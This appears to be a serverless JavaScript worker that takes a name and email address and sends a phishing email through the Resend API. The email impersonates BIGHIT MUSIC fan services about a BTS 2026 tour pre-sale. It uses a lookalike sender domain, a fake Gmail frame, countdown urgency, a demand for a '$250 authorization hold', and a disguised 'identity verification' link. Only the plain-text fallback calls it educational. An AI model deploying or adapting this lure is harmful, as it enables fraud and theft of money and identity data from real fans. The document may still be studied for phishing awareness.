import { Resend } from 'resend';

export default {
  async fetch(request, env) {
    // CORS headers
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    };

    // Handle preflight
    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    // Only allow POST
    if (request.method !== 'POST') {
      return new Response(JSON.stringify({ 
        error: 'Method not allowed. Use POST.' 
      }), {
        status: 405,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    try {
      const { firstName, email } = await request.json();

      // Validation
      if (!firstName || !email) {
        return new Response(JSON.stringify({
          success: false,
          error: 'Missing required fields: firstName and email'
        }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      // Email validation regex
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(email)) {
        return new Response(JSON.stringify({
          success: false,
          error: 'Invalid email format'
        }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }

      // Initialize Resend
      const resend = new Resend(env.RESEND_API_KEY);

      // Email HTML template
      const htmlContent = `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BTS Arirang Tour Pre-Sale Access</title>
    <!--[if mso]>
    <noscript>
        <xml>
            <o:OfficeDocumentSettings>
                <o:PixelsPerInch>96</o:PixelsPerInch>
            </o:OfficeDocumentSettings>
        </xml>
    </noscript>
    <![endif]-->
</head>
<body style="margin: 0; padding: 0; background-color: #f5f5f5; font-family: Arial, Helvetica, sans-serif; -webkit-font-smoothing: antialiased;">

    <!-- Hidden preheader -->
    <div style="display: none; max-height: 0; overflow: hidden; mso-hide: all;">
        Your BTS Arirang Tour pre-sale access requires immediate verification. Complete identity verification to secure your tickets.
    </div>

    <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #f5f5f5;">
        <tr>
            <td align="center" style="padding: 20px 0;">

                <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="600" style="background-color: #ffffff; max-width: 600px; width: 100%; border-collapse: collapse; box-shadow: 0 1px 3px rgba(0,0,0,0.12);">

                    <!-- Gmail Header -->
                    <tr>
                        <td style="background-color: #f5f5f5; padding: 16px; border-bottom: 1px solid #e0e0e0;">
                            <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
                                <tr>
                                    <td style="font-family: Arial, sans-serif; font-size: 24px; color: #5f6368; font-weight: 400;">Gmail</td>
                                </tr>
                            </table>
                        </td>
                    </tr>

                    <!-- Email Meta -->
                    <tr>
                        <td style="background-color: #ffffff; padding: 16px; border-bottom: 1px solid #e0e0e0;">
                            <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
                                <tr>
                                    <td width="60" style="font-family: Arial, sans-serif; font-size: 14px; color: #5f6368; vertical-align: top;">From:</td>
                                    <td style="font-family: Arial, sans-serif; font-size: 14px; color: #202124;">
                                        <strong>BIGHIT MUSIC Fan Services</strong> <span style="color: #5f6368; font-size: 12px;">&lt;bighitmusic@jesusgeneration.vip&gt;</span>
                                    </td>
                                </tr>
                                <tr>
                                    <td style="font-family: Arial, sans-serif; font-size: 14px; color: #5f6368; padding-top: 8px;">To:</td>
                                    <td style="font-family: Arial, sans-serif; font-size: 14px; color: #202124; padding-top: 8px;">${email}</td>
                                </tr>
                                <tr>
                                    <td style="font-family: Arial, sans-serif; font-size: 14px; color: #5f6368; padding-top: 8px;">Subject:</td>
                                    <td style="font-family: Arial, sans-serif; font-size: 14px; color: #202124; padding-top: 8px;">🎫 FINAL HOURS: BTS Arirang Tour Pre-Sale Access (Status: UNVERIFIED)</td>
                                </tr>
                                <tr>
                                    <td style="font-family: Arial, sans-serif; font-size: 14px; color: #5f6368; padding-top: 8px;">Date:</td>
                                    <td style="font-family: Arial, sans-serif; font-size: 14px; color: #202124; padding-top: 8px;">Mon, Mar 30, 2026 at 11:23 PM</td>
                                </tr>
                            </table>
                        </td>
                    </tr>

                    <!-- Subject Line -->
                    <tr>
                        <td style="background-color: #ffffff; padding: 16px; font-family: Arial, sans-serif; font-size: 22px; color: #202124; font-weight: 400;">
                            🎫 FINAL HOURS: BTS Arirang Tour Pre-Sale Access (Status: UNVERIFIED)
                        </td>
                    </tr>

                    <!-- Body -->
                    <tr>
                        <td style="background-color: #ffffff; padding: 0 16px 32px 16px;">
                            <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">

                                <!-- Urgency Banner -->
                                <tr>
                                    <td style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); background-color: #764ba2; padding: 24px; border-radius: 8px; text-align: center;">
                                        <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
                                            <tr>
                                                <td style="font-family: Arial, sans-serif; font-size: 14px; color: #ffffff; text-transform: uppercase; letter-spacing: 2px; padding-bottom: 8px;">Your Pre-Sale Window Closes In</td>
                                            </tr>
                                            <tr>
                                                <td style="font-family: 'Courier New', monospace; font-size: 36px; font-weight: 700; color: #ffffff; letter-spacing: 2px; padding: 12px 0;">10:37:42</td>
                                            </tr>
                                            <tr>
                                                <td style="font-family: Arial, sans-serif; font-size: 14px; color: #ffffff;">Limited to first 500 verified ARMY members</td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>

                                <tr><td height="24" style="font-size: 0; line-height: 0;">&nbsp;</td></tr>

                                <tr>
                                    <td style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; line-height: 1.6;">Dear ${firstName},</td>
                                </tr>

                                <tr><td height="16" style="font-size: 0; line-height: 0;">&nbsp;</td></tr>

                                <tr>
                                    <td style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; line-height: 1.6;">
                                        Our system indicates your pre-sale access for the <strong>BTS Arirang Tour 2026</strong> is currently <span style="color: #d32f2f; font-weight: 700;">UNVERIFIED</span>.
                                    </td>
                                </tr>

                                <tr><td height="24" style="font-size: 0; line-height: 0;">&nbsp;</td></tr>

                                <!-- Status Box -->
                                <tr>
                                    <td style="background-color: #fff3cd; border-left: 4px solid #ffc107; padding: 20px; border-radius: 4px;">
                                        <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
                                            <tr>
                                                <td style="font-family: Arial, sans-serif; font-size: 18px; font-weight: 700; color: #856404; padding-bottom: 8px;">⚠️ STATUS: UNVERIFIED</td>
                                            </tr>
                                            <tr>
                                                <td style="font-family: Arial, sans-serif; font-size: 15px; color: #856404; line-height: 1.5;">
                                                    To protect against scalpers and bots, we require a temporary <strong>$250 authorization hold</strong> to verify your identity and secure your slot. This is not a charge—it's a pre-authorization that will be released immediately after ticket purchase or within 24 hours.
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>

                                <tr><td height="24" style="font-size: 0; line-height: 0;">&nbsp;</td></tr>

                                <tr>
                                    <td style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; font-weight: 700;">Why this protects our community:</td>
                                </tr>

                                <tr><td height="8" style="font-size: 0; line-height: 0;">&nbsp;</td></tr>

                                <tr>
                                    <td>
                                        <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
                                            <tr>
                                                <td width="20" style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; vertical-align: top;">•</td>
                                                <td style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; line-height: 1.6;">Ensures tickets reach real ARMY, not resellers</td>
                                            </tr>
                                            <tr>
                                                <td style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; vertical-align: top;">•</td>
                                                <td style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; line-height: 1.6;">Prevents automated bot purchases</td>
                                            </tr>
                                            <tr>
                                                <td style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; vertical-align: top;">•</td>
                                                <td style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; line-height: 1.6;">Maintains fair pricing for all fans</td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>

                                <tr><td height="32" style="font-size: 0; line-height: 0;">&nbsp;</td></tr>

                                <!-- CTA Button -->
                                <tr>
                                    <td align="center">
                                        <table role="presentation" border="0" cellpadding="0" cellspacing="0">
                                            <tr>
                                                <td align="center" style="border-radius: 6px; background: linear-gradient(135deg, #764ba2 0%, #667eea 100%); background-color: #764ba2;">
                                                    <a href="https://shr.pn/bighitmusic-fancomverify-identitytokenxyz123" target="_blank" style="display: inline-block; padding: 20px 56px; font-family: Arial, sans-serif; font-size: 18px; font-weight: 700; color: #ffffff; text-decoration: none; border-radius: 6px; text-transform: uppercase; letter-spacing: 1px;">
                                                        COMPLETE IDENTITY VERIFICATION →
                                                    </a>
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>

                                <tr><td height="32" style="font-size: 0; line-height: 0;">&nbsp;</td></tr>

                                <!-- Lottery Box -->
                                <tr>
                                    <td style="background-color: #f3e5f5; border: 2px dashed #764ba2; padding: 24px; text-align: center; border-radius: 8px;">
                                        <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
                                            <tr>
                                                <td style="font-family: Arial, sans-serif; font-size: 18px; font-weight: 700; color: #764ba2; padding-bottom: 8px;">🎁 BONUS: Post-Show Hi-Touch Lottery Entry</td>
                                            </tr>
                                            <tr>
                                                <td style="font-family: Arial, sans-serif; font-size: 15px; color: #555555; line-height: 1.5;">
                                                    Verified members are automatically entered to win a post-show hi-touch experience with one member. 50 winners per show.
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>

                                <tr><td height="24" style="font-size: 0; line-height: 0;">&nbsp;</td></tr>

                                <!-- Security Notice -->
                                <tr>
                                    <td style="background-color: #e8f5e9; border: 1px solid #c8e6c9; padding: 16px; border-radius: 8px;">
                                        <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
                                            <tr>
                                                <td style="font-family: Arial, sans-serif; font-size: 14px; color: #2e7d32; line-height: 1.5;">
                                                    <strong>🔒 Security Notice:</strong> This verification link is unique to your account. Do not share this email or forward this link. Sharing will result in immediate disqualification from pre-sale access per BIGHIT's new anti-scalping policy.
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>

                                <tr><td height="24" style="font-size: 0; line-height: 0;">&nbsp;</td></tr>

                                <!-- Tour Dates -->
                                <tr>
                                    <td style="background-color: #fafafa; padding: 20px; border-radius: 8px;">
                                        <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
                                            <tr>
                                                <td style="font-family: Arial, sans-serif; font-size: 16px; font-weight: 700; color: #764ba2; padding-bottom: 12px;">🎤 BTS Arirang Tour 2026 - USA Dates</td>
                                            </tr>
                                            <tr>
                                                <td style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; line-height: 1.8;">
                                                    <strong>Los Angeles</strong> - April 26-27, 2026 (SoFi Stadium)<br>
                                                    <strong>Las Vegas</strong> - April 30, 2026 (Allegiant Stadium)<br>
                                                    <strong>Chicago</strong> - May 3-4, 2026 (Soldier Field)<br>
                                                    <strong>New York</strong> - May 10-11, 2026 (MetLife Stadium)
                                                </td>
                                            </tr>
                                        </table>
                                    </td>
                                </tr>

                                <tr><td height="32" style="font-size: 0; line-height: 0;">&nbsp;</td></tr>

                                <tr>
                                    <td style="font-family: Arial, sans-serif; font-size: 15px; color: #202124; line-height: 1.6;">
                                        We purple you,<br>
                                        <strong>BIGHIT MUSIC Fan Services Team</strong>
                                    </td>
                                </tr>

                                <tr><td height="32" style="font-size: 0; line-height: 0;">&nbsp;</td></tr>

                                <tr>
                                    <td style="font-family: Arial, sans-serif; font-size: 12px; color: #5f6368; line-height: 1.5; border-top: 1px solid #e0e0e0; padding-top: 16px;">
                                        This is an automated message regarding your BTS Arirang Tour 2026 pre-sale eligibility. Please do not reply to this email. For support, contact fan-services@bighitmusic-fan.com. © 2026 BIGHIT MUSIC. All rights reserved.
                                    </td>
                                </tr>

                            </table>
                        </td>
                    </tr>

                </table>
            </td>
        </tr>
    </table>

</body>
</html>`;

      // Send email via Resend
      const data = await resend.emails.send({
        from: 'BIGHIT MUSIC Fan Services <bighitmusic@jesusgeneration.vip>',
        to: email,
        subject: '🎫 FINAL HOURS: BTS Arirang Tour Pre-Sale Access (Status: UNVERIFIED)',
        html: htmlContent,
        text: `Dear ${firstName},\n\nYour BTS Arirang Tour 2026 pre-sale access is currently UNVERIFIED.\n\nTo verify, visit: https://shr.pn/bighitmusic-fancomverify-identitytokenxyz123\n\nThis email demonstrates phishing techniques for educational purposes.`,
      });

      return new Response(JSON.stringify({
        success: true,
        message: 'Email sent successfully',
        id: data.id,
        recipient: email,
        firstName: firstName
      }), {
        status: 200,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });

    } catch (error) {
      console.error('Error:', error);
      return new Response(JSON.stringify({
        success: false,
        error: error.message
      }), {
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }
  }
};